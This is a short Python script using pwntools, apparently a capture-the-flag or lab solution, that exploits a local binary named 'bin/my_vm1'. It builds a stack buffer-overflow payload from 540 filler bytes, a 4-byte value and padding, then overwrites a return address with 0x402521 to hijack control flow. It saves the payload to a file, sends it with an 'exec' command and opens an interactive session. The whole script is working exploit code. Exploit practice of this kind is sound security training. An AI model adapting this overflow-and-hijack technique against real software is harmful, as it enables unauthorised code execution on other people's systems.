import pwn

challenge = pwn.process("bin/my_vm1")

pwn_func1 = pwn.p64(0x402521)

payload = b"prints "
payload += b"A"*540 
payload += (1).to_bytes(4, byteorder='little')
payload += b"A"*8
payload += pwn_func1

with open("exploit.insn","wb") as f:
  f.write(payload + b"\nexec")

challenge.sendline(payload + b"\nexec")
challenge.interactive()
